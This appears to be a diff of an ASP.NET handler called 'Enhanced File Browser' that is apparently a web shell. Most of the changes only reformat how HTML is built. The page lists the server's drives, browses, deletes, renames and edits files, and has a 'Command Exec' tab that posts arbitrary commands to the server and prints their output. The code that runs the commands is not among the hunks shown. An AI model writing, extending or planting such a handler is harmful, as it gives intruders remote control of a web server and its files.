@@ -19,114 +19,100 @@ public class EnhancedFileBrowser : IHttpHandler
         string currentPath = ValidatePathOrDefault(requestedPath);
 
         StringBuilder html = new StringBuilder();
-        html.Append("<html><head><title>Enhanced File Browser</title>");
-        html.Append(@"<style>
-            body{font-family:Segoe UI,sans-serif;}
-            nav { margin-bottom: 20px; }
-            nav a { margin-right: 15px; text-decoration:none; font-weight:bold; cursor:pointer;}
-            table { border-collapse: collapse; width: 100%; }
-            th, td {border: 1px solid #ccc; padding: 8px; text-align:left;}
-            tr:hover {background-color: #f0f0f0;}
-            .error{color:red;} .success{color:green;}
-            .tab {display:none;} .tab.active{display:block;}
-            .button {padding:5px 10px; margin:2px; cursor:pointer;}
-            ul.dir-list {list-style:none; padding-left:0; margin:0 0 1em 0;}
-            ul.dir-list li {margin:3px 0;}
-            a.back-link {
-                font-weight:bold;
-                display:inline-block;
-                margin-bottom:10px;
-                text-decoration:none;
-            }
-            a.back-link:hover {
-                text-decoration: underline;
-            }
-            </style>");
-        html.Append(@"<script>
-            function showTab(id) {
-                var tabs = document.getElementsByClassName('tab');
-                for(var i=0; i<tabs.length; i++) {
-                    tabs[i].classList.remove('active');
-                }
-                document.getElementById(id).classList.add('active');
-            }
-            function confirmDelete(path) {
-                if(confirm('Are you sure to delete ' + path + '?')) {
-                    window.location.href = '?action=delete&path=' + encodeURIComponent(path);
-                }
-            }
-            function renameFile(path) {
-                var newName = prompt('Enter new name:', '');
-                if(newName) {
-                    var url = '?action=rename&path=' + encodeURIComponent(path) + '&newname=' + encodeURIComponent(newName);
-                    window.location.href = url;
-                }
-            }
-            function editFile(path) {
-                var url = '?action=editform&path=' + encodeURIComponent(path);
-                window.location.href = url;
-            }
-            function toggleDrives() {
-                var d = document.getElementById('drivesList');
-                if(d.style.display === 'none' || d.style.display === '') d.style.display = 'block';
-                else d.style.display = 'none';
-            }
-            // ajax submit for command exec
-            function executeCommand(event) {
-                event.preventDefault();
-                var form = event.target;
-                var xhr = new XMLHttpRequest();
-                var formData = new FormData(form);
-                xhr.open('POST', form.action, true);
-                xhr.onload = function() {
-                    if(xhr.status === 200) {
-                        document.getElementById('cmdOutput').innerHTML = '<pre style=\"background:#eee;padding:10px;\">' + xhr.responseText.replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</pre>';
-                    }
-                };
-                xhr.send(formData);
-            }
-            </script>");
-        html.Append("</head><body>");
+        html.AppendLine("<html><head><title>Enhanced File Browser</title>");
+        html.AppendLine("<style>");
+        html.AppendLine("body{font-family:Segoe UI,sans-serif;}");
+        html.AppendLine("nav { margin-bottom: 20px; }");
+        html.AppendLine("nav a { margin-right: 15px; text-decoration:none; font-weight:bold; cursor:pointer;}");
+        html.AppendLine("table { border-collapse: collapse; width: 100%; }");
+        html.AppendLine("th, td {border: 1px solid #ccc; padding: 8px; text-align:left;}");
+        html.AppendLine("tr:hover {background-color: #f0f0f0;}");
+        html.AppendLine(".error{color:red;} .success{color:green;}");
+        html.AppendLine(".tab {display:none;} .tab.active{display:block;}");
+        html.AppendLine(".button {padding:5px 10px; margin:2px; cursor:pointer;}");
+        html.AppendLine("ul.dir-list {list-style:none; padding-left:0; margin:0 0 1em 0;}");
+        html.AppendLine("ul.dir-list li {margin:3px 0;}");
+        html.AppendLine("a.back-link { font-weight:bold; display:inline-block; margin-bottom:10px; text-decoration:none; }");
+        html.AppendLine("a.back-link:hover { text-decoration: underline; }");
+        html.AppendLine("</style>");
+        html.AppendLine("<script>");
+        html.AppendLine("function showTab(id) {");
+        html.AppendLine("var tabs = document.getElementsByClassName('tab');");
+        html.AppendLine("for(var i=0; i<tabs.length; i++) { tabs[i].classList.remove('active'); }");
+        html.AppendLine("document.getElementById(id).classList.add('active');");
+        html.AppendLine("}");
+        html.AppendLine("function confirmDelete(path) {");
+        html.AppendLine("if(confirm('Are you sure to delete ' + path + '?')) {");
+        html.AppendLine("window.location.href = '?action=delete&path=' + encodeURIComponent(path);");
+        html.AppendLine("}");
+        html.AppendLine("}");
+        html.AppendLine("function renameFile(path) {");
+        html.AppendLine("var newName = prompt('Enter new name:', '');");
+        html.AppendLine("if(newName) {");
+        html.AppendLine("var url = '?action=rename&path=' + encodeURIComponent(path) + '&newname=' + encodeURIComponent(newName);");
+        html.AppendLine("window.location.href = url;");
+        html.AppendLine("}");
+        html.AppendLine("}");
+        html.AppendLine("function editFile(path) {");
+        html.AppendLine("var url = '?action=editform&path=' + encodeURIComponent(path);");
+        html.AppendLine("window.location.href = url;");
+        html.AppendLine("}");
+        html.AppendLine("function toggleDrives() {");
+        html.AppendLine("var d = document.getElementById('drivesList');");
+        html.AppendLine("if(d.style.display === 'none' || d.style.display === '') d.style.display = 'block';");
+        html.AppendLine("else d.style.display = 'none';");
+        html.AppendLine("}");
+        html.AppendLine("function executeCommand(event) {");
+        html.AppendLine("event.preventDefault();");
+        html.AppendLine("var form = event.target;");
+        html.AppendLine("var xhr = new XMLHttpRequest();");
+        html.AppendLine("var formData = new FormData(form);");
+        html.AppendLine("xhr.open('POST', form.action, true);");
+        html.AppendLine("xhr.onload = function() {");
+        html.AppendLine("if(xhr.status === 200) {");
+        html.AppendLine("document.getElementById('cmdOutput').innerHTML = '<pre style=\"background:#eee;padding:10px;\">' + xhr.responseText.replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</pre>';}");
+        html.AppendLine("};");
+        html.AppendLine("xhr.send(formData);");
+        html.AppendLine("}");
+        html.AppendLine("</script>");
+        html.AppendLine("</head><body>");
 
         // Drives list toggle button and container
-        html.Append(@"<button onclick='toggleDrives()' style='margin-bottom:10px;padding:5px 10px;'>Toggle Drives List</button>");
-        html.Append(@"<div id='drivesList' style='display:none;border:1px solid #ccc;padding:10px;margin-bottom:15px;background:#f9f9f9;'>");
+        html.AppendLine("<button onclick='toggleDrives()' style='margin-bottom:10px;padding:5px 10px;'>Toggle Drives List</button>");
+        html.AppendLine("<div id='drivesList' style='display:none;border:1px solid #ccc;padding:10px;margin-bottom:15px;background:#f9f9f9;'>");
 
         try
         {
             string[] drives = Environment.GetLogicalDrives();
-            foreach(string drive in drives)
+            foreach (string drive in drives)
             {
                 string encodedDrive = HttpUtility.UrlEncode(drive);
-                html.Append($"<a href='?path={encodedDrive}' style='margin-right:15px;font-weight:bold;'>{drive}</a>");
+                html.AppendLine($"<a href='?path={encodedDrive}' style='margin-right:15px;font-weight:bold;'>{drive}</a>");
             }
         }
-        catch(Exception)
-        {
-            // swallow
-        }
-        html.Append("</div>");
+        catch { /* Ignore exceptions here */ }
+        html.AppendLine("</div>");
 
-        html.Append("<nav>");
-        html.Append("<a onclick=\"showTab('browseTab')\">Browse Files</a> | ");
-        html.Append("<a onclick=\"showTab('cmdTab')\">Command Exec</a>");
-        html.Append("</nav>");
+        html.AppendLine("<nav>");
+        html.AppendLine("<a onclick=\"showTab('browseTab')\">Browse Files</a> | ");
+        html.AppendLine("<a onclick=\"showTab('cmdTab')\">Command Exec</a>");
+        html.AppendLine("</nav>");
 
         string message = PerformActions(context, action, currentPath, out currentPath);
         if (!string.IsNullOrEmpty(message))
         {
-            html.Append($"<p>{message}</p>");
+            html.AppendLine($"<p>{message}</p>");
         }
 
-        html.Append("<div id='browseTab' class='tab active'>");
-        html.Append(RenderFileBrowser(context, currentPath));
-        html.Append("</div>");
+        html.AppendLine("<div id='browseTab' class='tab active'>");
+        html.AppendLine(RenderFileBrowser(context, currentPath));
+        html.AppendLine("</div>");
 
-        html.Append("<div id='cmdTab' class='tab'>");
-        html.Append(RenderCommandExec(context));
-        html.Append("</div>");
+        html.AppendLine("<div id='cmdTab' class='tab'>");
+        html.AppendLine(RenderCommandExec(context));
+        html.AppendLine("</div>");
 
-        html.Append("</body></html>");
+        html.AppendLine("</body></html>");
         context.Response.Write(html.ToString());
     }
 
@@ -246,6 +232,7 @@ public class EnhancedFileBrowser : IHttpHandler
     {
         StringBuilder sb = new StringBuilder();
         sb.Append($"<h2>Browsing: {HttpUtility.HtmlEncode(path)}</h2>");
+
         sb.Append(@"<form method='get'>
             <input type='hidden' name='action' value='newfolder'/>
             <input type='hidden' name='path' value='" + HttpUtility.HtmlEncode(path) + @"'/>
@@ -340,7 +327,7 @@ public class EnhancedFileBrowser : IHttpHandler
     {
         StringBuilder sb = new StringBuilder();
         sb.Append("<h2>Command Execution</h2>");
-        sb.Append($@"<form method='post' action='EnhancedFileBrowser.ashx' onsubmit='executeCommand(event)'>
+        sb.Append(@"<form method='post' action='EnhancedFileBrowser.ashx' onsubmit='executeCommand(event)'>
             <input type='hidden' name='action' value='cmdexec'/>
             <textarea name='cmdtext' rows='10' cols='80' style='width:100%;font-family:monospace;' placeholder='Enter command here'></textarea><br/>
             <input type='submit' value='Run Command'/>
